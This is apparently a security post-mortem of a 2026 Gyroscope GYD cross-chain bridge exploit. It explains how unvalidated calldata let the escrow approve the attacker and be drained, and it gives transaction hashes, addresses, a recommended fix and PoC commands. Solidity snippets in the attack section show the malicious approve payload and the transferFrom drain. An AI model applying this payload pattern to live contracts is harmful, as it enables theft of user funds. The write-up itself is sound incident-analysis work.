# Gyroscope CCIP Bridge Exploit

## Incident Overview

| Field | Value |
|-------|-------|
| Date | 2026-01-30 |
| Protocol | Gyroscope (GYD Token Bridge) |
| Chains | Arbitrum → Ethereum Mainnet |
| Loss | ~$6M (entire GYD escrow balance) |
| Root Cause | Arbitrary Calldata Execution |

### Transaction Hashes
| Chain | Tx Hash |
|-------|---------|
| Arbitrum (Source) | `0x51c22898a9b9f519a10b0a0be89b9d51c0248adb80cc0f89e57437e15e6c60c7` |
| Ethereum (Exploit) | `0x45739a92c2d99f172a74d8028736a2fd1b507ac6fc134680cd1dccd3c572c600` |

### Key Addresses
| Role | Address |
|------|---------|
| Attacker | `0x7DD4075A6eAe9f18309F112364f0394C2DfA8102` |
| GYD (Arbitrum) | `0xCA5d8F8a8d49439357d3CF46Ca2e720702F132b8` |
| GYD (Ethereum) | `0xe07F9D810a48ab5c3c914BA3cA53AF14E4491e8A` |
| GYDL1CCIPEscrow | `0xa1886c8d748DeB3774225593a70c79454B1DA8a6` |
| EVM2EVMOffRamp | `0xdf615eF8D4C64d0ED8Fd7824BBEd2f6a10245aC9` |

---

## The Vulnerability

### What Was the Flaw?

Gyroscope's cross-chain bridge used Chainlink CCIP to transfer GYD tokens between Arbitrum and Ethereum. The `bridgeToken()` function accepted a `data` parameter that was intended for legitimate bridge operations, but **the contract failed to validate or restrict what calldata could be passed**.

```solidity
function bridgeToken(
    uint64 destinationChainSelector,
    address recipient,
    uint256 amount,
    bytes memory data  // ← No validation on this parameter
) external payable;
```

### What Was Missing?

1. **No Calldata Validation**: The bridge blindly forwarded user-supplied `data` to the destination chain without checking its contents.

2. **No Function Selector Whitelist**: Any function could be called on the destination contract, not just intended bridge operations.

3. **Escrow as msg.sender**: When the CCIP message was processed on Ethereum, the `GYDL1CCIPEscrow` contract executed the calldata, meaning the escrow itself became the `msg.sender` for any arbitrary call.

---

## The Attack

### Step 1: Craft Malicious Bridge Message (Arbitrum)

The attacker called `bridgeToken()` on Arbitrum with a specially crafted `data` parameter:

```solidity
bytes memory maliciousData = abi.encodeWithSelector(
    IERC20.approve.selector,
    attacker,           // spender = attacker
    type(uint256).max   // amount = unlimited
);

IGYD(GYD).bridgeToken{value: bridgeFee}(
    ethereumChainSelector,
    GYD_ETH,
    1,                  // minimal amount to trigger bridge
    maliciousData       // ← payload that will call approve()
);
```

### Step 2: CCIP Relays the Message

Chainlink's CCIP network picked up the message and relayed it to Ethereum mainnet. The CCIP infrastructure has no knowledge of application-level semantics—it simply delivers the message as instructed.

### Step 3: Escrow Executes Malicious Calldata (Ethereum)

On Ethereum, the `EVM2EVMOffRamp` contract delivered the message to `GYDL1CCIPEscrow`. The escrow contract then executed:

```solidity
// Inside GYDL1CCIPEscrow (simplified)
GYD_ETH.call(data);  // data = approve(attacker, MAX)
```

This resulted in:
```
GYD_ETH.approve(attacker, type(uint256).max)
```

**Critically, the `msg.sender` of this `approve()` call was the escrow contract itself**, which held all bridged GYD tokens.

### Step 4: Drain the Escrow

With unlimited approval granted, the attacker simply called:

```solidity
IERC20(GYD_ETH).transferFrom(
    GYDL1CCIPEscrow,
    attacker,
    IERC20(GYD_ETH).balanceOf(GYDL1CCIPEscrow)  // entire balance
);
```

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ARBITRUM                                       │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Attacker                                                                  │
│      │                                                                      │
│      │ bridgeToken(data: approve(attacker, MAX))                           │
│      ▼                                                                      │
│   GYD Contract ──────► CCIP Router ──────► CCIP Network                    │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                                    │
                                    │ Cross-chain message relay
                                    ▼
┌─────────────────────────────────────────────────────────────────────────────┐
│                           ETHEREUM MAINNET                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   EVM2EVMOffRamp                                                           │
│      │                                                                      │
│      │ Deliver CCIP message                                                │
│      ▼                                                                      │
│   GYDL1CCIPEscrow                                                          │
│      │                                                                      │
│      │ Execute: GYD.approve(attacker, MAX)                                 │
│      │ (msg.sender = Escrow)                                               │
│      ▼                                                                      │
│   GYD Token: allowance[Escrow][Attacker] = MAX                             │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────    │
│                                                                             │
│   Attacker                                                                  │
│      │                                                                      │
│      │ transferFrom(Escrow, Attacker, Escrow.balance)                      │
│      ▼                                                                      │
│   ~$6M GYD drained                                                         │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## Lessons Learned

### For Developers

1. **Never trust user-supplied calldata in cross-chain messages.** Always validate function selectors and parameters before execution.

2. **Use allowlists for permitted operations.** If a bridge only needs to transfer tokens, only allow `transfer()` calls.

3. **Separate concerns.** The contract holding funds (escrow) should not be the same contract executing arbitrary external calls.

4. **Consider using a proxy pattern** where the escrow only responds to specific, pre-defined actions rather than arbitrary calldata.

### Recommended Fix

```solidity
// Before (Vulnerable)
function _ccipReceive(bytes memory data) internal {
    token.call(data);  // Arbitrary execution
}

// After (Secure)
function _ccipReceive(bytes memory data) internal {
    (address recipient, uint256 amount) = abi.decode(data, (address, uint256));
    token.transfer(recipient, amount);  // Only transfer allowed
}
```

---

## Proof of Concept

### Run the Exploit

```bash
git fetch origin && git checkout incident/2026-01-30_Gyroscope
forge test --match-test testExploit -vvvv
```

### Test Output

The PoC demonstrates the full attack flow:
1. Initiates bridge request on Arbitrum with malicious calldata
2. Simulates CCIP relay to Ethereum mainnet
3. Executes the approval via escrow
4. Drains all GYD tokens to attacker

---

## Auditors
- [ ] @wiimdy

## Status
- [x] Workspace initialized
- [x] Root cause identified
- [x] PoC implemented
- [ ] Mitigation verified
